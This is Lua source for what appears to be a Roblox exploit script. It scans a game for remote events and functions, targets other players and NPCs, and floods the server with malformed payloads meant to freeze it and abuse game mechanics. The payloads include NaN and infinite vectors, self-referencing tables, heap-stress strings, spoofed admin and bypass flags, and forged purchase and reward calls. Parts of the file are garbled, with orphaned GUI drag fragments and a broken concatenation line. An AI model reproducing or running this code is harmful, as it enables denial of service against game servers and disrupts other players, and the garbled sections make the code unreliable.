-- MODULE 2: RECURSIVE ENVIRONMENT SCANNING & POINTER HARVESTING

function ApexEngine:ScanEnvironment()
    Log("Executing deep recursive traversal across all server services and pointer registries...")
    
    Cache.TouchEvents = {}
    Cache.AllRemoteEvents = {}
    Cache.UnreliableRemotes = {}
    Cache.RemoteFunctions = {}
    Cache.ReplicatedHoldings = {}
    Cache.SpatialContainers = {}
    Cache.PhysicsConstraints = {}
    Cache.ValueTreats = {}
    Cache.HighValueItems = {}
    Cache.EcosystemContainers = {}
    Cache.TaggedInstances = {}
    
    local rootLocations = {
        Services.ReplicatedStorage,
        Services.ReplicatedFirst,
        Services.JointsService,
        Services.Workspace,
        Services.Players,
        Services.StarterGui,
        Services.Lighting,
        Services.SoundService,
        Services.Teams,
        Services.TextChatService,
        Services.Chat
    }
    
    for _, location in ipairs(rootLocations) do
        task.spawn(function()
            pcall(function()
                for _, obj in ipairs(location:GetDescendants()) do
                    if obj:IsA("RemoteEvent") then
                        table.insert(Cache.AllRemoteEvents, obj)
                        local nameLower = obj.Name:lower()
                        if nameLower:find("touch") or obj.Name == "TouchEvent" or nameLower:find("event") or 
                           nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
                           nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
                           nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
                           nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
                           nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") or
                           nameLower:find("state") or nameLower:find("save") or nameLower:find("admin") then
                            table.insert(Cache.TouchEvents, obj)
                        end
                    elseif obj.ClassName == "UnreliableRemoteEvent" then
                        table.insert(Cache.UnreliableRemotes, obj)
                        table.insert(Cache.AllRemoteEvents, obj)
                    elseif obj:IsA("RemoteFunction") then
                        table.insert(Cache.RemoteFunctions, obj)
                    end
                    
                    if obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
                        table.insert(Cache.ValueTreats, obj)
                    end
                    
                    if obj:IsA("Tool") or obj:IsA("Accessory") then
                        table.insert(Cache.HighValueItems, obj)
                    end
                    
                    if (location == Services.ReplicatedStorage or location == Services.Lighting) and (obj:IsA("Folder") or obj:IsA("Configuration")) then
                        table.insert(Cache.ReplicatedHoldings, obj)
                    end
                    
                    if location == Services.Workspace and obj:IsA("Folder") then
                        local fName = obj.Name:lower()
                        if fName:find("hitbox") or fName:find("projectile") or fName:find("debris") or 
                           fName:find("zone") or fName:find("spawn") or fName:find("active") or
                           fName:find("map") or fName:find("world") or fName:find("loot") or
                           fName:find("drop") or fName:find("shop") or fName:find("portal") or
                           fName:find("quest") or fName:find("chest") or fName:find("interactive") or
                           fName:find("region") or fName:find("effect") or fName:find("terrain") then
                            table.insert(Cache.SpatialContainers, obj)
                            table.insert(Cache.EcosystemContainers, obj)
                        end
                    end

                    if obj:IsA("Constraint") then
                        table.insert(Cache.PhysicsConstraints, obj)
                    end
                end
            end)
        end)
    end
    
    pcall(function()
        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest", "Persistent"}
        for _, tag in ipairs(commonTags) do
            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
                table.insert(Cache.TaggedInstances, taggedObj)
            end
        end
    end)
    
    Cache.TriggerParts = {}
    pcall(function()
        for _, obj in ipairs(Services.Workspace:GetDescendants()) do
            if obj:IsA("BasePart") then
                local name = obj.Name:lower()
                if name:find("trip") or name:find("trigger") or name:find("touch") or 
                   name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
                   name:find("platform") or name:find("button") or name:find("lever") or 
                   name:find("zone") or name:find("teleport") or name:find("damage") or 
                   name:find("kill") or name:find("switch") or name:find("pad") or
                   name:find("portal") or name:find("shop") or name:find("chest") or
                   name:find("loot") or name:find("quest") or name:find("checkpoint") or
                   name:find("door") or name:find("barrier") or name:find("spawn") or
                   name:find("region") or name:find("effect") or name:find("interact") or
                   obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
                   obj:FindFirstChildOfClass("ProximityPrompt") then
                    table.insert(Cache.TriggerParts, obj)
                end
            end
        end
    end)
    
    Cache.Initialized = true
    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
    Log(string.format("Scan Complete. Loaded: %d Remotes, %d Triggers, %d Ecosystem Folders.", 
        #Cache.AllRemoteEvents, #Cache.TriggerParts, #Cache.EcosystemContainers))
end

-- ============================================================================
-- MODULE 3: TARGET RESOLUTION ENGINE
-- ============================================================================
function ApexEngine:ResolveTargets()
    Cache.OtherPlayers = {}
    Cache.NPCs = {}
    
    if Config.TargetAllPlayers then
        for _, player in ipairs(Services.Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local char = player.Character
                local hrp = char:FindFirstChild("HumanoidRootPart")
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                
                if hrp and humanoid then
                    local playerData = {
                        Player = player,
                        Character = char,
                        HRP = hrp,
                        Humanoid = humanoid,
                        Head = char:FindFirstChild("Head"),
                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
                        Backpack = player:FindFirstChild("Backpack"),
                        Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
                        Parts = {},
                        Values = {}
                    }
                    
                    for _, part in ipairs(char:GetDescendants()) do
                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
                           part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") or
                           part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Constraint") or
                           part:IsA("ValueBase") or part:IsA("Tool") or part:IsA("Bone") or
                           part:IsA("BodyColors") then
                            table.insert(playerData.Parts, part)
                        end
                    end
                    
                    table.insert(Cache.OtherPlayers, playerData)
                end
            end
        end
    end
    
    if Config.TargetNPCs then
        local npcFolders = {
            Services.Workspace:FindFirstChild("Customers"),
            Services.Workspace:FindFirstChild("NPCs"),
            Services.Workspace:FindFirstChild("Enemies"),
            Services.Workspace:FindFirstChild("Characters"),
            Services.Workspace:FindFirstChild("Mobs"),
            Services.Workspace:FindFirstChild("Dummies"),
            Services.Workspace:FindFirstChild("Bosses"),
            Services.Workspace:FindFirstChild("Minions"),
            Services.Workspace:FindFirstChild("Merchants"),
            Services.Workspace:FindFirstChild("Vendors")
        }
        
        for _, folder in ipairs(npcFolders) do
            if folder then
                for _, npc in ipairs(folder:GetDescendants()) do
                    if npc:IsA("Model") then
                        local hrp = npc:FindFirstChild("HumanoidRootPart")
                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
                        
                        if hrp and humanoid then
                            local npcData = {
                                Character = npc,
                                HRP = hrp,
                                Humanoid = humanoid,
                                Parts = {}
                            }
                            for _, part in ipairs(npc:GetDescendants()) do
                                if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Sound") or part:IsA("Constraint") or part:IsA("Tool") or part:IsA("Bone") then
                                    table.insert(npcData.Parts, part)
                                end
                            end
                            table.insert(Cache.NPCs, npcData)
                        end
                    end
                end
            end
        end
    end
    
    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
    return Cache.Stats.PlayersAffected
end

function ApexEngine:FirePayloads()
    if not Config.Active then return 0 end
    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
        self:ResolveTargets()
        if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then return 0 end
    end
    
    local fireCount = 0
    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
    
    local allTargets = {}
    if Config.TargetAllPlayers then
        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
    end
    if Config.TargetNPCs then
        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
    end
    
    local triggerParts = Cache.TriggerParts or {}
    local persistentPool = Cache.PersistentStatePool
    local valueTreats = Cache.ValueTreats
    local taggedInstances = Cache.TaggedInstances
    
    local randomState = persistentPool[math.random(1, #persistentPool)]
    
    -- Dense C++ native userdata payloads
    local heavyNativeTypes = {
        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true, 0),
        PhysicalProperties.new(Enum.Material.SmoothPlastic),
        RaycastParams.new(),
        BrickColor.random(),
        Color3.new(math.random(), math.random(), math.random())
    }
    local randomUserData = heavyNativeTypes[math.random(1, #heavyNativeTypes)]

    local transientHeapStress = {}
    for i = 1, 500 + (intensity * 150) do
        transientHeapStress[i] = string.rep("EVERLASTING_STATE_MUTATION_BUFFER_", 16)
    end

    -- Everlasting cyclic table with persistent mutation flags
    local everlastingTable = {}
    everlastingTable.self = everlastingTable
    everlastingTable.parentRef = everlastingTable
    everlastingTable.timestamp = os.clock()
    everlastingTable.sessionToken = math.random(10000000, 99999999)
    everlastingTable.statePayload = randomState
    everlastingTable.treats = valueTreats[math.random(1, math.max(1, #valueTreats))]
    everlastingTable.nativeData = randomUserData
    everlastingTable.heapSpam = transientHeapStress
    everlastingTable.metadata = {
        verified = false,
        bypass = true,
        admin = true,
        serverSide = true,
        firecd = true,
        stateDeploy = true,
        everlastingPersistence = true,
        permanentMutation = true,
        spamBuffer = string.rep("EVERLASTING_APEX_STREAM_", 32)
    }
    
    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
    
    -- High-priority worker distribution for instant feedback
    for _, touchEvent in ipairs(Cache.TouchEvents) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            if #triggerParts > 0 then
                local part = triggerParts[math.random(1, #triggerParts)]
                task.defer(function()
                    if not Config.Active then return end
                    SafeCall(function()
                        touchEvent:FireServer(target.HRP, part, randomState, randomUserData, everlastingTable)
                        fireCount = fireCount + 1
                    end)
                end)
            end
            if #taggedInstances > 0 then
                local taggedObj = taggedInstances[math.random(1, #taggedInstances)]
                task.defer(function()
                    if not Config.Active then return end
                    SafeCall(function()
                        touchEvent:FireServer(target.Character, taggedObj, extremeVector, "everlastingTagSync")
                        fireCount = fireCount + 1
                    end)
                end)
            end
        end
    end
    
    -- 15 expanded mutation argument patterns per RemoteEvent
    for _, remote in ipairs(Cache.AllRemoteEvents) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            task.defer(function()
                if not Config.Active then return end
                SafeCall(function() remote:FireServer(target.HRP, "buy", "item", randomUserData, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "sell", "loot", randomUserData, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Humanoid, "craft", "recipe", 999999, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, "upgrade", "skill", extremeVector, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, extremeCFrame, "claim", "reward", randomUserData, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "quest", "complete", "redeem", everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(everlastingTable, "trade", "offer", Services.Workspace, randomUserData) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Backpack, "interact", "use", {serverSide = true, permanent = true}) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, target.Character, target.Humanoid, "consume", true, false, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(Services.Lighting, Services.Teams, extremeVector, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, "firecd", "cooldown", "debounce", transientHeapStress, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Character, "stateChange", "modify", "physicsUpdate", extremeCFrame, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.Player, target.UserId, "treatConsume", valueTreats[1], everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(Services.ReplicatedStorage, Services.SoundService, transientHeapStress, extremeVector, everlastingTable) fireCount = fireCount + 1 end)
                SafeCall(function() remote:FireServer(target.HRP, target.Humanoid, target.Character, everlastingTable, transientHeapStress, extremeCFrame, randomUserData, {serverSide = true, FEOnly = true, permanentMutation = true, everlastingPersistence = true}) fireCount = fireCount + 1 end)
            end)
        end
    end
    
    -- RemoteFunction permanent mutation invocations
    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
        for _, target in ipairs(allTargets) do
            if not Config.Active then break end
            task.spawn(function()
                if not Config.Active then return end
                SafeCall(function()
                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomState, randomUserData, everlastingTable, extremeVector, "firecd", "permanentDeploy", transientHeapStress)
                    fireCount = fireCount + 1
                end)
            end)
        end
    end
    
    return fireCount
end

            dragStart = input.Position
            startPos = Main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)

            dragInput = input
        end
    end)

            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)

function GUI.UpdateStats()
    if not GUI.RemoteStat then return end
    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
    
    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
                     tostring(Cache.Stats.TotalFired)
    GUI.FiredStat.Text = "💥 Fired: " + formatted -- string fallback fix
    GUI.FiredStat.Text = "💥 Fired: " .. formatted
end

function GUI.UpdateStatus()
    if not GUI.Status or not GUI.Toggle then return end
    if Config.Active then
        GUI.Status.Text = Config.FullFreezeActive and "🚨 FULL FREEZE BLITZ!" or "🔥 ACTIVE (EVERLASTING MODE)"
        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
        GUI.Toggle.Text = "⏸️ STOP"
        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
    else
        GUI.Status.Text = "💤 INACTIVE (STANDBY)"
        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
        GUI.Toggle.Text = "🔥 START 🔥"
        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
    end
end

        end
    end
